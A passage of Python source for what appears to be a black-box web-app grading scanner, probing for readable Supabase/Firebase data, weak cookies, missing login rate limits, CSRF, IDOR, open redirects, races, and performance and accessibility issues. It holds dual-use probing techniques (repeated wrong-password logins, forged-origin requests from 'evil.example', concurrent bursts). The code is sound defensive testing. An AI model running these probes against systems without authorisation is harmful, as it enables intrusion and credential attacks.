    with httpx.Client(timeout=8.0, follow_redirects=True, verify=False) as ext:   # external provider hosts
        if sm:
            base = "https://" + sm.group(1) + ".supabase.co"
            hit = _supabase_readable(ext, base, keys)
            if isinstance(hit, dict):
                ctx.evidence.update(backend="supabase", host=base, table=hit["table"],
                                    rows_readable=hit["rows"], columns=hit["columns"])
                return True
            reached = reached or hit != "unreachable"
        if fm:
            data = _firebase_readable(ext, "https://" + fm.group(1) + "/.json")
            if isinstance(data, (dict, list)) and data:
                ctx.evidence.update(backend="firebase-rtdb", host=fm.group(1),
                                    sample_keys=sorted(data)[:8] if isinstance(data, dict) else len(data))
                return True
            reached = reached or data != "unreachable"
    ctx.evidence.update(checked=True, reachable=reached, world_readable=False)
    return False if reached else None   # reached-but-protected = clean; unreachable = N/A (egress blocked)


def session_cookie_missing_flag(ctx, probe) -> bool | None:
    """Self-as-oracle: register an account, then inspect the session cookie it sets. Slop if it lacks
    the hardening flag named in the probe (httponly | samesite | secure). Returns None (-> N/A) when
    self-registration couldn't establish a session (CSRF/JSON-API app) — a false 'clean' would be a
    missed finding, not a pass."""
    flag = probe.probe.get("flag", "httponly")
    account = ctx.register()
    if account is None:
        return None  # couldn't self-register -> couldn't test
    try:
        cookie = auth.session_cookie(account.register_response)
        if cookie is None:
            return None  # registration yielded no recognizable session cookie -> couldn't test
        ctx.evidence.update(flag=flag, present=cookie[flag])
        return not cookie[flag]
    finally:
        account.client.close()


def session_token_in_local_storage(ctx, probe) -> bool | None:
    """Self-as-oracle: register, then report whether the app PERSISTED its session token in localStorage. A JWT in
    localStorage is readable by any XSS on the origin (unlike an HttpOnly cookie) — the token-auth analog of a
    session cookie missing HttpOnly, and the bolt/Supabase/Firebase cohort's default session model. Slop when a
    persisted token was found; clean when a session was established WITHOUT one (a cookie, or an in-memory bearer);
    N/A when no session could be established — reading localStorage needs the browser register (httpx alone can't),
    so this is inherently N/A without --browser-auth, never a false 'clean'."""
    account = ctx.register()
    if account is None:
        return None  # couldn't self-register -> couldn't test
    try:
        if account.provided:
            return None  # a --header session reveals nothing about how the app STORES its token -> can't assess
        if not auth._has_session(account):
            return None  # no session established (email-verify/CAPTCHA/SSO, or httpx-only run) -> couldn't test
        exposed = bool(account.storage_exposed)
        ctx.evidence.update(session_in_local_storage=exposed)
        return exposed  # True = token sits in localStorage (XSS-exfiltratable); False = session held elsewhere
    finally:
        account.client.close()


# A genuine login backend REJECTS wrong creds with an auth-shaped answer. A client-side-auth SPA (Supabase/
# Firebase from the browser) or a platform-hosted static page just echoes a 200 shell — or 405/404 — for the
# POST: there's no server auth of the app's to rate-limit, so a "no rate limiting" finding there is a phantom
# (the biggest sec-ratelimit-001 FP class, mostly UNDER precision.py's catch-all radar since these hosts 404
# real paths). find_json_login already applies this test on the JSON path; this brings the HTML path to parity.
_AUTH_REJECT = re.compile(
    r"invalid|incorrect|wrong\s*(?:password|credential|email|username)|bad\s+credential|"
    r"authentication\s+failed|login\s+failed|unauthor|not\s+authorized", re.IGNORECASE)


def _looks_like_auth_reject(resp) -> bool:
    """True when `resp` is a real login backend saying 'no' to wrong creds — an auth-failure status, a
    redirect to a login/error page, a JSON answer, or an auth-failure phrase — NOT a bare 200 shell / 405 /
    404. Gates the rate-limit finding onto endpoints that ACTUALLY process credentials."""
    try:
        sc = resp.status_code
    except Exception:
        return False
    if sc in (400, 401, 403, 422):
        return True
    if sc in (301, 302, 303, 307, 308):
        return any(h in resp.headers.get("location", "").lower() for h in _CSRF_REJECT_HINTS)
    if "json" in resp.headers.get("content-type", "").lower():
        return True
    try:
        return bool(_AUTH_REJECT.search(resp.text[:20000]))
    except Exception:
        return False


def login_no_rate_limit(ctx, probe) -> bool | None:
    """Self-as-oracle: fire N wrong-password logins at the login form; slop if NONE is throttled
    (HTTP 429/423). With no brute-force protection every attempt returns the same auth-failure status,
    enabling credential stuffing / password spraying. Uses its own username so a per-account lockout
    can't collide with other probes that hit /login (e.g. sqli_auth_bypass). N/A when no login form, or
    when the endpoint never returns an auth-shaped rejection (no real server auth to rate-limit)."""
    form = auth.login_form(ctx.profile.forms)
    if form is None:
        return _login_rate_limit_json(ctx, probe)  # no HTML login form -> try a JSON login endpoint
    data = {}
    for name in form.fields:
        low = name.lower()
        if "pass" in low:
            data[name] = "hl-wrong-password"
        elif "email" in low or "mail" in low:
            data[name] = "hacklet_probe_rl@example.com"
        else:
            data[name] = "hacklet_probe_rl"
    attempts = probe.probe.get("attempts", 10)
    saw_auth = False
    with httpx.Client(base_url=ctx.base_url, timeout=15.0, follow_redirects=False) as c:
        for n in range(attempts):
            try:
                resp = c.request((form.method or "post").upper(), form.action, data=data)
            except (httpx.HTTPError, httpx.InvalidURL):
                return None  # login endpoint unreachable -> couldn't test
            if resp.status_code in (429, 423):
                ctx.evidence.update(throttled=True, after_attempts=n + 1)
                return False  # throttled -> brute-force protection present -> clean
            saw_auth = saw_auth or _looks_like_auth_reject(resp)
    if not _endpoint_is_live(ctx, ctx.client, form.action, form.method or "post", resp):
        return None  # the login endpoint is a catch-all phantom (root or per-prefix) -> nothing to rate-limit
    if not saw_auth:
        return None  # no attempt looked like a real auth rejection -> client-side / static / platform login,
                     # no server auth of the app's to rate-limit (a phantom finding otherwise)
    ctx.evidence.update(throttled=False, attempts=attempts, via="html-form")
    return True  # N attempts, never throttled -> no rate limiting -> slop


def _login_rate_limit_json(ctx, probe) -> bool | None:
    """JSON-API fallback for login_no_rate_limit: find a JSON login endpoint (Juice Shop /rest/user/
    login, /api/login, ...) and hammer it with wrong creds. N/A when no JSON login endpoint responds."""
    attempts = probe.probe.get("attempts", 10)
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=False) as c:
        path, creds, first = auth.find_json_login(c)
        if path is None:
            return None  # no login surface at all -> couldn't test
        if first.status_code in (429, 423):
            ctx.evidence.update(throttled=True, after_attempts=1, via="json-login")
            return False  # already throttling
        for _ in range(attempts - 1):  # find_json_login already made the first attempt
            try:
                r = c.post(path, json=creds)
            except (httpx.HTTPError, httpx.InvalidURL):
                return None
            if r.status_code in (429, 423):
                ctx.evidence.update(throttled=True, via="json-login")
                return False
    ctx.evidence.update(throttled=False, attempts=attempts, via="json-login")
    return True


# Redirect destinations that signal a CSRF REJECTION (request not honored) rather than acceptance.
_CSRF_REJECT_HINTS = ("login", "signin", "sign-in", "sign_in", "auth", "error",
                      "denied", "forbidden", "unauthorized")


_CSRF_SKIP = ("login", "signin", "sign-in", "sign_in", "log-in", "logout", "logoff",
              "search", "query", "register", "signup", "sign-up")
_CSRF_STATE = ("password", "passwd", "pwd", "email", "delete", "remove", "update", "change",
               "settings", "profile", "transfer", "role", "account", "new_", "edit", "save", "admin")


def _is_login_form(action_low: str, fields_low: str) -> bool:
    """A plain authentication form (username/email + password, no change/reset indicator) — its cross-
    site submission is login-CSRF (a distinct, lesser issue), not the state-change CSRF we grade."""
    has_pw = "pass" in fields_low
    has_user = any(h in fields_low for h in ("user", "email", "login"))
    changes = any(h in action_low + " " + fields_low
                  for h in ("new", "change", "update", "confirm", "reset", "current", "old"))
    return has_pw and has_user and not changes


def _csrf_candidates(profile):
    """State-changing forms that carry NO anti-CSRF token: a POST, or a form whose action/fields name a
    state change (email/delete/settings/...). Login/search/logout/register are excluded — and so is a
    password-CHANGE form: submitting it would reset (and lock out) the grader's own session. CSRF is
    still detected via the app's other tokenless state-changers (guestbook/comment/settings)."""
    out = []
    for f in profile.forms:
        low, fields_low = f.action.lower(), " ".join(f.fields).lower()
        if any(h in low for h in _CSRF_SKIP) or _is_login_form(low, fields_low) \
                or auth.is_password_change_form(f):
            continue
        if ((f.method or "get").lower() == "post" or any(h in low + " " + fields_low for h in _CSRF_STATE)) \
                and not any(auth.is_csrf_field(x) for x in f.fields):
            out.append(f)
    return out


def csrf_missing(ctx, probe) -> bool | None:
    """A state-changing request accepted cross-site with no CSRF token and no SameSite cookie -> no
    CSRF defense. Works with a provided --header session OR a self-registered one. Skips forms that
    carry a token; in self-register mode also skips a SameSite session (both valid defenses). N/A when
    there's no candidate form or no session to test with."""
    candidates = _csrf_candidates(ctx.profile)
    if not candidates:
        return None  # no tokenless state-changing form -> N/A
    account = None
    if ctx.headers:                                   # grade the authenticated surface as the given user
        client = make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=False)
    else:                                             # open-registration app: be our own user
        account = ctx.register(suffix="_csrf")
        if account is None:
            return None
        cookie = auth.session_cookie(account.register_response)
        if cookie is not None and cookie["samesite"]:
            account.client.close()
            ctx.evidence.update(vulnerable=False, defense="samesite-cookie")
            return False  # a SameSite session blocks cross-site sending -> already defended
        client = account.client
    try:
        real_tested = 0
        for form in candidates:
            method = (form.method or "post").upper()
            data = {f: ("password" if "pass" in f.lower() else "hl-csrf") for f in form.fields}
            kw = {"params": data} if method == "GET" else {"data": data}
            try:
                resp = client.request(method, form.action, headers={"Origin": "https://evil.example"},
                                      follow_redirects=False, **kw)
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if not _endpoint_is_live(ctx, client, form.action, method, resp):
                continue  # a catch-all phantom endpoint (root or per-prefix) -> nothing really accepted it
            real_tested += 1
            if resp.is_redirect:
                # a redirect to login/auth/error is a CSRF REJECTION, not an accepted state change
                if any(h in resp.headers.get("location", "").lower() for h in _CSRF_REJECT_HINTS):
                    continue
                ctx.evidence.update(vulnerable=True, form=form.action)
                return True
            if resp.status_code < 400:
                ctx.evidence.update(vulnerable=True, form=form.action)
                return True  # state-changing, no token, accepted cross-site -> CSRF
        ctx.evidence.update(vulnerable=False, forms_tested=real_tested)
        return False if real_tested else None  # every candidate was a phantom shell -> couldn't test -> N/A
    finally:
        if account is not None:
            account.client.close()
        else:
            client.close()


def _set_cookie_values(resp):
    out = []
    for raw in resp.headers.get_list("set-cookie"):
        first = raw.split(";", 1)[0]
        if "=" in first:
            name, val = first.split("=", 1)
            out.append((name.strip(), val.strip()))
    return out


def _weak_token(values) -> bool:
    """A session token is weak if it's too short, a short numeric counter/timestamp, or sequential."""
    distinct = [v for v in dict.fromkeys(values) if v]
    if not distinct:
        return False
    if all(len(v) <= 8 for v in distinct):
        return True                                     # < ~48 bits -> brute-forceable
    numeric = [v for v in distinct if v.isdigit()]
    if len(numeric) == len(distinct):                   # every token is purely numeric
        if all(len(v) <= 12 for v in distinct):
            return True                                 # a short numeric counter / timestamp
        if len(numeric) >= 3:
            ints = sorted(int(v) for v in numeric)
            if all(0 < ints[i + 1] - ints[i] <= 5 for i in range(len(ints) - 1)):
                return True                             # sequential -> the next id is guessable
    return False


def weak_session_id(ctx, probe) -> bool | None:
    """Weak / predictable session identifiers: collect the session tokens the app issues (across fresh,
    cookieless requests) plus any provided one, and flag short / purely-numeric / sequential values. A
    strong random token (long, mixed alphabet) reads clean. N/A when no session token is observed."""
    samples: dict[str, list] = {}

    def add(name, val):
        if auth._is_session_cookie(name):
            samples.setdefault(name, []).append(val)

    routes = ["/"] + [r for r in ctx.profile.routes
                      if re.search(r"session|login|token|weak|sess|auth", r, re.IGNORECASE)]
    for route in list(dict.fromkeys(routes))[:6]:
        for _ in range(8):
            with make_client(ctx.base_url, ctx.headers, timeout=8.0, follow_redirects=True) as c:
                try:
                    resp = c.get(route)
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                for name, val in _set_cookie_values(resp):
                    add(name, val)
    for hv in [v for k, v in (ctx.headers or {}).items() if k.lower() == "cookie"]:
        for part in hv.split(";"):
            if "=" in part:
                add(part.split("=", 1)[0].strip(), part.split("=", 1)[1].strip())
    if not samples:
        return None
    weak = any(_weak_token(vals) for vals in samples.values())
    ctx.evidence.update(weak=weak, cookies=list(samples.keys()),
                        samples=sum(len(v) for v in samples.values()))
    return True if weak else False


def dom_xss(ctx, probe) -> bool:
    """Browser oracle: inject an executing payload across discovered routes and render — fires when
    it runs in the DOM, catching reflected-that-executes and DOM-sink XSS a source check misses.
    Gated on the `browser` capability, so it's N/A unless the run enabled rendering."""
    executed = browser.dom_xss_executes(ctx.base_url, ctx.profile.routes, headers=ctx.headers)
    ctx.evidence.update(executed=bool(executed), routes_rendered=len(ctx.profile.routes))
    return executed


def _served(ctx, path: str) -> bool:
    """Does the target path exist (not 404)? Lets a probe fall back from a declared endpoint a real
    target doesn't serve to a representative one (the homepage), instead of silently no-opping."""
    try:
        return ctx.client.get(path).status_code != 404
    except (httpx.HTTPError, httpx.InvalidURL):
        return False


def slow_first_paint(ctx, probe) -> bool:
    """Browser oracle: render and read First Contentful Paint; slop if it exceeds the gate — the
    user-facing 'slow app' signal (client render delay, distinct from server TTFB). Browser-gated.
    Measures the declared page if served, else the homepage (real apps don't serve the reference path)."""
    target = probe.probe.get("target", "/")
    if not _served(ctx, target):
        target = "/"
    url = ctx.base_url.rstrip("/") + target
    # median of N renders, not one sample: FCP is wall-clock timing (JIT warmup, CPU/network jitter),
    # so a single sample near the gate flips between runs -> non-deterministic score. The isinstance
    # filter also drops any non-numeric value a hostile page could inject (would raise TypeError).
    samples = [browser.first_contentful_paint(url, headers=ctx.headers) for _ in range(3)]
    vals = [s for s in samples if isinstance(s, (int, float))]
    if not vals:
        return False
    fcp = statistics.median(vals)
    threshold = probe.probe.get("threshold_ms", 1000)
    ctx.evidence.update(fcp_ms=round(fcp), threshold_ms=threshold)
    return fcp > threshold


def slow_core_web_vitals(ctx, probe) -> bool:
    """Browser oracle: Core Web Vitals (LCP / CLS / total blocking time) sampled over N device-throttled
    renders and scored off the PLAYER-FAVORABLE EDGE (best-of-N) against Google's POOR thresholds (set
    beyond the normal variance band) -- so the app has to be poor even on its BEST run to fire, and
    measurement variance can only ever help the player. Browser-gated."""
    target = probe.probe.get("target", "/")
    if not _served(ctx, target):
        target = "/"
    url = ctx.base_url.rstrip("/") + target
    samples = browser.web_vitals(url, headers=ctx.headers, samples=probe.probe.get("samples", 3))
    if not samples:
        return False
    best_lcp = min(s["lcp_ms"] for s in samples)   # lower is better -> take the player's best run
    best_cls = min(s["cls"] for s in samples)
    best_tbt = min(s["tbt_ms"] for s in samples)
    bad = {"LCP": best_lcp > probe.probe.get("lcp_ms", 4000),   # Google "poor": LCP>4s / CLS>0.25 / TBT>600ms
           "CLS": best_cls > probe.probe.get("cls", 0.25),
           "TBT": best_tbt > probe.probe.get("tbt_ms", 600)}
    ctx.evidence.update(best_lcp_ms=best_lcp, best_cls=best_cls, best_tbt_ms=best_tbt,
                        samples=len(samples), failed=[k for k, v in bad.items() if v])
    return any(bad.values())


_CONSOLE_INTACT_SCALE = 0.4   # an uncaught error that DIDN'T visibly break the render is a real defect but not
                              # a functional break -> scaled below the ceiling (the flat 22 over-fired on these)
_CONSOLE_MIN_CONTENT = 50     # visible body text below this (+ an error) reads as a near-empty/degraded render


def _console_broken_render(res: dict) -> bool:
    """Did the uncaught error visibly BREAK the render? True on a framework crash overlay/message or a
    near-empty body. A FULL white-screen is already DNF'd upstream (functional=False), so the live zone here
    is PARTIAL breakage — the app rendered but shows a crash / lost a region."""
    if res.get("error_overlay"):
        return True
    cl = res.get("content_len")
    return cl is not None and cl < _CONSOLE_MIN_CONTENT


def console_errors_present(ctx, probe) -> bool:
    """Browser oracle: the page throws an uncaught JavaScript error FROM ITS OWN CODE on load. A third-party
    widget/analytics script throwing (cross-origin, browser-sanitized to "Script error.") is common on
    working apps and does NOT count — only first-party errors are the team's durability failure. The penalty
    is SCALED by render impact (see _console_broken_render): full when the error visibly broke the page,
    reduced when the app rendered fine despite it (a real but non-fatal defect). Browser-gated."""
    url = ctx.base_url.rstrip("/") + probe.probe.get("target", "/")
    res = browser.console_errors(url, headers=ctx.headers)
    if res is None:
        return False   # no browser / render failed -> can't test (browser-gated)
    ctx.evidence.update(js_errors=res["total"], first_party=res["first_party"],
                        third_party=res["third_party"], engine="pageerror")
    if res["first_party"] <= 0:
        return False
    broken = _console_broken_render(res)
    ctx.evidence.update(content_len=res.get("content_len"), error_overlay=bool(res.get("error_overlay")),
                        render_broken=broken,
                        penalty_override=probe.penalty if broken else max(1, round(probe.penalty * _CONSOLE_INTACT_SCALE)))
    return True


_A11Y_TIER = {"critical": 30, "serious": 18, "moderate": 10, "minor": 4}
_A11Y_DECAY = 0.6   # SAME within-category diminishing-returns constant as aggregate.CATEGORY_DECAY: each
                    # additional barrier adds less MARGINAL exclusion (populations overlap; a multi-barrier
                    # app is already substantially unusable) -> a11y stacks like every other category, not raw
# a no-browser static hard-fail -> the axe impact of the equivalent rule, so a11y-002's SUM uses the same
# tiers as a11y-001 (the two probes are one logical flaw, one static one rendered).
_STATIC_A11Y_IMPACT = {"missing-lang": "serious", "img-missing-alt": "critical", "missing-title": "serious",
                       "control-no-accessible-name": "critical", "low-contrast": "serious"}


def _a11y_penalty(impacts: dict) -> int:
    """Diminishing-returns sum of the a11y penalty: each DISTINCT violated rule contributes its impact tier,
    but the worst counts FULL and each additional decays by _A11Y_DECAY (sorted desc) — the SAME damper every
    other multi-finding category gets. a11y was the lone raw-SUM category, which let barriers stack to a
    runaway tail (one app hit 150, 2.5x the security ceiling); the damper caps the worst at ~65 while leaving
    single-/few-barrier apps untouched. Still ADDITIVE across orthogonal populations (2 barriers > 1: a
    contrast miss blocks low-vision, a missing label blocks screen-readers), just with decreasing MARGINAL
    harm — the 6th barrier adds less new exclusion than the 1st (populations overlap; the app is already
    largely unusable). `impacts` counts RULES not nodes (a systematic issue across 50 buttons is one barrier).
    Tiers (critical 30 > serious 18 > moderate 10 > minor 4) aim weight at exclusion over cosmetics."""
    tiers = sorted((_A11Y_TIER.get(level, _A11Y_TIER["minor"])
                    for level, n in impacts.items() for _ in range(n)), reverse=True)
    return round(sum(v * (_A11Y_DECAY ** i) for i, v in enumerate(tiers)))


def a11y_violations_present(ctx, probe) -> bool:
    """Browser oracle: WCAG 2 A/AA accessibility violations from axe-core (its deterministic `violations`
    set) above the threshold. Browser-gated; axe reports only algorithmically-determinable failures, so
    it stays intent-independent (the `incomplete`/needs-review rules are excluded). The penalty is a
    per-rule severity-tiered SUM (see _a11y_penalty) so a multi-barrier page outscores a single-barrier
    one and a lone cosmetic issue isn't charged the full exclusion penalty."""
    url = ctx.base_url.rstrip("/") + probe.probe.get("target", "/")
    viols = browser.a11y_violations(url, headers=ctx.headers)
    if viols is None:
        return False
    impacts: dict[str, int] = {}
    for v in viols:
        impacts[v.get("impact")] = impacts.get(v.get("impact"), 0) + 1
    ctx.evidence.update(violations=len(viols), rules=sorted({v["id"] for v in viols})[:15],
                        impacts=impacts, engine="axe-core", penalty_override=_a11y_penalty(impacts))
    return len(viols) > probe.probe.get("threshold", 0)


def dead_controls_present(ctx, probe) -> bool:
    """Browser oracle: clickable controls wired to nothing — clicking moves no channel (DOM / network /
    navigation / dialog / error). The AI-shell-app tell, the interactive analogue of a broken link.
    Browser-gated. The helper under-reports rather than over-reports (any observed motion clears a
    control), so a fired finding is high-confidence — we never penalize a working app whose effect we
    merely failed to observe."""
    url = ctx.base_url.rstrip("/") + probe.probe.get("target", "/")
    dead = browser.inert_controls(url, headers=ctx.headers, max_controls=probe.probe.get("max_controls", 10))
    if dead is None:
        return False   # no browser / render failed -> inconclusive, not a false "clean"
    ctx.evidence.update(dead_controls=len(dead), labels=dead[:8])
    return len(dead) > probe.probe.get("threshold", 0)


_REDIRECT_PARAMS = ("next", "url", "redirect", "return", "dest", "continue", "to", "r")
_REDIRECT_PROBE_HOST = "hacklet-redirect-probe.example"
_REDIRECT_ENDPOINTS = ("/redirect", "/login", "/logout", "/go", "/out", "/auth/callback", "/sso")


def open_redirect(ctx, probe) -> bool:
    """A user-controlled redirect param that sends the browser to an arbitrary EXTERNAL host -> open
    redirect (phishing / OAuth-token theft). Intent-independent: fires only on a 3xx whose Location
    host is our foreign probe host. Tests discovered routes plus common redirect endpoints/params."""
    evil = {p: "https://" + _REDIRECT_PROBE_HOST + "/x" for p in _REDIRECT_PARAMS}
    seen = set()
    with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=False) as c:
        for path in list(ctx.profile.routes) + list(_REDIRECT_ENDPOINTS):
            if path in seen:
                continue
            seen.add(path)
            try:
                resp = c.get(path, params=evil)
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if resp.is_redirect and urllib.parse.urlparse(
                    resp.headers.get("location", "")).hostname == _REDIRECT_PROBE_HOST:
                ctx.evidence.update(vulnerable=True, endpoint=path)
                return True
    ctx.evidence.update(vulnerable=False, endpoints_tested=len(seen))
    return False


def idor_horizontal(ctx, probe) -> bool | None:
    """Self-as-oracle: register A and B, A creates a resource, B fetches it by URL. If B can read
    A's content, object-level access control is broken (horizontal IDOR). N/A when we can't register
    both accounts or A can't create a distinct resource to test against (not a false clean)."""
    form = auth.create_form(ctx.profile.forms)
    if form is None:
        ctx.evidence["na_reason"] = "no create form to seed a resource A owns"
        return None
    a, b = _two_accounts(ctx)
    if a is None:
        return None
    # extract each session cookie (jar iteration avoids CookieConflict) and re-send it plainly, so an
    # authed create/read isn't dropped over http when the app sets a Secure cookie (that's tested by
    # sec-session-003, separately). Same approach race_resource_ids already uses. Carry the Authorization
    # header too — the bolt/Supabase/Firebase cohort authenticates by Bearer token, not a cookie, so a
    # cookie-only re-send would run the create/read anonymously and read a false N/A.
    a_cookies = {c.name: c.value for c in a.client.cookies.jar}
    b_cookies = {c.name: c.value for c in b.client.cookies.jar}
    a_auth = {k: v for k, v in a.client.headers.items() if k.lower() == "authorization"}
    b_auth = {k: v for k, v in b.client.headers.items() if k.lower() == "authorization"}
    try:
        marker = "hl-idor-7a3f9c"
        with httpx.Client(base_url=ctx.base_url, timeout=10.0, follow_redirects=True,
                          cookies=a_cookies, headers=a_auth) as ac:
            resource = ac.post(form.action, data={n: marker for n in form.fields}).url.path
        if not resource or resource == form.action:  # no distinct resource created -> couldn't test
            ctx.evidence["na_reason"] = "create didn't yield a distinct per-resource URL (SPA client-render)"
            return None
        with httpx.Client(base_url=ctx.base_url, timeout=10.0, cookies=b_cookies, headers=b_auth) as bc:
            leaked = bc.get(resource)
        cross = leaked.status_code == 200 and marker in leaked.text
        ctx.evidence.update(cross_read=cross, resource=resource)
        return cross
    except (httpx.HTTPError, httpx.InvalidURL):
        return None
    finally:
        a.client.close()
        b.client.close()


def _fanout(work, n: int):
    """Run `work` (a no-arg callable) n times concurrently; return the n results in submit order.
    The shared concurrency primitive for the self-as-oracle race/load probes."""
    with ThreadPoolExecutor(max_workers=n) as ex:
        return [f.result() for f in [ex.submit(work) for _ in range(n)]]


def _concurrent_creates(base_url, path, cookies, data, n: int = 12):
    def create():
        try:
            with httpx.Client(base_url=base_url, timeout=10.0, follow_redirects=True, cookies=cookies) as c:
                return c.post(path, data=data).url.path
        except Exception:
            return None
    return _fanout(create, n)


_RESOURCE_ID = re.compile(r"/(?:\d+|[0-9a-f]{6,})/?$", re.I)   # path ends in a numeric or hex/uuid id segment


def _resource_shaped(u: str, action: str) -> bool:
    """True when `u` is a PER-RESOURCE URL (a create landed on /notes/1), not a fixed landing page. A real
    id-allocation race is only observable when creates expose distinct ids; a redirect to a shared success
    page (/home, /dashboard) exposes none. It tells a catastrophic all-collide race (every create ->
    /notes/1, which IS a real race) apart from a fixed success-page redirect (every create -> /home, which
    is not). Match a sub-path of the create endpoint, or a trailing numeric/hex id."""
    a = action.rstrip("/")
    return (u.startswith(a + "/") and len(u) > len(a) + 1) or bool(_RESOURCE_ID.search(u))


def race_resource_ids(ctx, probe) -> bool | None:
    """Self-as-oracle: register, then fire N concurrent resource creates and inspect the assigned IDs,
    REPEATED across a few bursts. A duplicate id WITHIN a burst means id allocation isn't atomic under
    concurrency — a race. A correct (atomic) app never collides, so a race is intent-independent slop; but
    a race is probabilistic, so a single burst flip-flops the score on re-grade. We require the collision
    to REPRODUCE across bursts (>= min_collisions) — a strong race fires every re-grade, a marginal one
    reads clean every re-grade, which is the computational-reproducibility the score needs. We also require
    a PARTIAL collision (some ids distinct AND some duplicated): if EVERY create returns the same path, the
    app just doesn't use per-resource URLs (a fixed success-page redirect), which is not observable as a
    race — read N/A, never a phantom fire. N/A too when there's no create form or we can't self-register."""
    form = auth.create_form(ctx.profile.forms)
    if form is None:
        ctx.evidence["na_reason"] = "no create form to race"
        return None
    account = ctx.register(suffix="_race")
    if account is None:
        ctx.evidence["na_reason"] = "self-registration not reachable black-box (SDK/email-confirm/captcha signup)"
        return None
    bursts = probe.probe.get("bursts", 3)
    need = probe.probe.get("min_collisions", 2)   # repeated collision -> a reproducible fire
    try:
        # iterate the jar, not dict(cookies) — dict() raises httpx.CookieConflict when the session
        # cookie was set on multiple paths/domains during the register redirect chain.
        cookies = {c.name: c.value for c in account.client.cookies.jar}
        # fill the form's ACTUAL fields (was hardcoded {"text": ...}); a real create form named
        # content/body/title would otherwise get an empty POST and the race would never be detected.
        data = {f: "hl-race" for f in form.fields}
        observed_ids = False   # did we EVER see per-resource URLs to compare (otherwise: can't observe ids)
        collided = 0           # bursts that showed an id collision (the race signature)
        for _ in range(bursts):
            urls = _concurrent_creates(ctx.base_url, form.action, cookies, data)
            # count only PER-RESOURCE URLs. A create landing on /notes/1 exposes an id to compare; one that
            # redirects to the form action or a fixed landing (login/error/dashboard) exposes none, so
            # uniform landings can't look like a race. This is what tells a real all-collide race (every
            # create -> /notes/1) apart from a fixed success-page redirect (every create -> /home).
            created = [u for u in urls if u and u != form.action
                       and not any(h in u.lower() for h in _CSRF_REJECT_HINTS)
                       and _resource_shaped(u, form.action)]
            if len(created) < 2:
                continue
            observed_ids = True
            if len(set(created)) < len(created):   # fewer distinct ids than creates -> a race this burst
                collided += 1
        if not observed_ids:
            ctx.evidence["na_reason"] = "creates don't expose per-resource URLs to compare (SPA client-render / fixed redirect)"
            return None   # never saw per-resource ids to compare (fixed redirect / <2 creates) -> couldn't test
        ctx.evidence.update(bursts=bursts, collided_bursts=collided, min_collisions=need)
        return collided >= need
    finally:
        account.client.close()


def _concurrent_get(base_url, path, n: int = 20, headers=None):
    def get():
        try:
            with make_client(base_url, headers, timeout=15.0) as c:
                return c.get(path).status_code
        except Exception:
            return None
    return _fanout(get, n)


def load_resilience(ctx, probe) -> bool:
    """Fire a concurrent burst at an endpoint; slop if it falls over (>10% 5xx) under load — the
    resource-exhaustion / unsynchronized-shared-state failure that only surfaces under concurrency."""
    target = probe.probe.get("target", "/")
    if not _served(ctx, target):
        # declared endpoint not served (real app) -> burst the homepage, the representative
        # always-present endpoint. NEVER fan across all routes: concurrent bursts at every endpoint
        # of a live target is a DoS.
        target = "/"
    ratios = []
    for _ in range(3):  # median of N bursts, not one: a target near the 10% gate flips between runs
        statuses = _concurrent_get(ctx.base_url, target, headers=ctx.headers)
        if statuses:
            # None = connection refused/dropped/timeout — a HARDER fall-over than a 500, counted over
            # the whole burst so an app that crashes the connection can't read cleaner than one that 500s.
            failures = sum(1 for s in statuses if s is None or s >= 500)
            ratios.append(failures / len(statuses))
    if not ratios:
        return False
    med = statistics.median(ratios)
    ctx.evidence.update(fail_ratio=round(med, 3), threshold=0.1, target=target)
    return med > 0.1


# Performance rubric (see perf.py): measure objective primitives on the homepage and grade against the
# tiered, published thresholds. `tier` = "profile" (tight, standardized-sandbox) or "ceiling" (absolute,
# environment-robust); the two are separate catalog probes sharing a variant_group -> the worse tier
# fires once. The homepage is the representative always-present target (real apps have no /heavy).
# Subresources a browser AUTO-LOADS: src on media/script tags + href on <link> (stylesheet/preload).
# Deliberately NOT <a href> — those are user navigations, not page assets, and blindly GETting them can
# fire a destructive link (e.g. DVWA's <a href="logout.php"> would log the grader's session out mid-run,
# de-authenticating every probe after it). Also the correct definition for page-weight / request-count.
_ASSET_REF = re.compile(
    r"""<(?:(?:img|script|iframe|embed|audio|video|source|track)\b[^>]*\bsrc|link\b[^>]*\bhref)"""
    r"""\s*=\s*["']([^"']+)["']""", re.IGNORECASE)


def _page_weight(c, base_url, path="/"):
    """(total bytes, request count) for the homepage + up to 40 same-origin CSS/JS/img/media assets."""
    try:
        r = c.get(path)
    except (httpx.HTTPError, httpx.InvalidURL):
        return 0, 0
    total, reqs = len(r.content), 1
    if "html" not in r.headers.get("content-type", "").lower():
        return total, reqs                      # non-HTML homepage (JSON API) -> just the body
    base = urllib.parse.urlparse(base_url)
    assets = []
    for ref in _ASSET_REF.findall(r.text):
        ref = ref.split("#")[0].strip()
        if not ref or ref.startswith(("data:", "javascript:", "mailto:", "tel:")):
            continue
        t = urllib.parse.urlparse(urllib.parse.urljoin("%s://%s%s" % (base.scheme, base.netloc, path), ref))
        if t.netloc == base.netloc and t.path:
            assets.append(t.path)
    uniq = list(dict.fromkeys(assets))
    reqs += len(uniq)                         # request count = homepage + EVERY referenced asset
    for a in uniq[:40]:                       # fetch a bounded subset for the weight number
        try:
            total += len(c.get(a).content)
        except (httpx.HTTPError, httpx.InvalidURL):
            continue
    return total, reqs


def perf_ttfb(ctx, probe) -> bool:
    """Homepage time-to-first-byte (server compute) exceeds the tier threshold — p90 over samples."""
    thresh = perf.TTFB_CEILING if probe.probe.get("tier") == "ceiling" else perf.TTFB_PROFILE
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=True) as c:
        sample = perf.sample_ttfb(c, probe.probe.get("target", "/"))
    ctx.evidence.update(ttfb_s=round(sample, 3), threshold_s=thresh,
                        tier=probe.probe.get("tier", "profile"))
    return sample >= thresh


def perf_page_weight(ctx, probe) -> bool:
    """Total homepage transfer weight (HTML + critical assets) exceeds the tier threshold."""
    thresh = perf.WEIGHT_CEILING if probe.probe.get("tier") == "ceiling" else perf.WEIGHT_PROFILE
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=True) as c:
        weight = _page_weight(c, ctx.base_url, probe.probe.get("target", "/"))[0]
